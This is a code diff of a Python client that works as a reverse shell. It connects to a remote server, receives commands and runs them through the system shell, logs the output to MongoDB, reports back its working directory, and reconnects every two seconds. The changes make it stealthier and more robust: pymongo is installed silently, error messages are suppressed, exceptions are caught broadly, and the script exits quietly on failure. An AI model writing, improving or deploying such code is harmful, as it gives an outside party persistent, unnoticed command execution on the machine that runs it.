@@ -2,25 +2,28 @@
 import socket
 import subprocess
 import time
-# import threading
 from os import chdir, getcwd
-import importlib.util
+from importlib.util import find_spec
+import signal
+from sys import exit
 
 # since pymongo is not installed by default, it's better to check for it first
-if not importlib.util.find_spec('pymongo'):
-    subprocess.check_output("pip3 install pymongo", shell=True)
+if not find_spec('pymongo'):
+    subprocess.Popen("pip3 install pymongo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-import pymongo
+if find_spec('pymongo'):
+    import pymongo
+else:
+    exit(0)
 
-
-class ConnectionDBFailed(Exception):
-    pass
+errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception, BrokenPipeError)
+signal.signal(signal.SIGINT, signal.SIG_DFL)
 
 
 class Client:
     def __init__(self, ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:27017/"):
-        self.ip, self.port, self.db_link = ip, port, db_link
-        self.conn = True
+        self.ip, self.port = ip, port
+
         self.myclient = pymongo.MongoClient(db_link)
         self.mydb = self.myclient[db_name]
         self.mycol = self.mydb[collection_name]
@@ -39,14 +42,13 @@ class Client:
 
     def start(self):
         """Start the connection, the loop of receiving and returning cwd start."""
-
         try:
             self.s.connect((self.ip, self.port))
-        except (socket.error, ConnectionDBFailed):
+        except errors_might_happen:
             return
 
         self.s.settimeout(60)
-        self.s.send(getcwd().encode()) # to let the server_ know the startup cwd.
+        self.s.send(getcwd().encode())  # to let the server_ know the startup cwd.
         while True:  # to keep receiving
             try:
                 msg_got = self.s.recv(1024).decode().strip()
@@ -57,7 +59,7 @@ class Client:
                     try:
                         chdir(msg_got[3:])
                     except FileNotFoundError:
-                        print("NOt Found")
+                        pass
                 out, error = subprocess.Popen(msg_got, shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE).communicate()
                 if out:
@@ -68,8 +70,8 @@ class Client:
                 else:
                     self.mycol.insert_one(self.msg_to_send(error.decode().strip()))
 
-                self.s.send(getcwd().encode()) # last path after command, to keep server_ updated
-            except (ConnectionDBFailed, socket.error):
+                self.s.send(getcwd().encode())  # last path after command, to keep server updated
+            except errors_might_happen:
                 break
 
 
@@ -79,4 +81,3 @@ collection_name = 'data_got'
 while True:
     Client(port=50000)
     time.sleep(2)
-
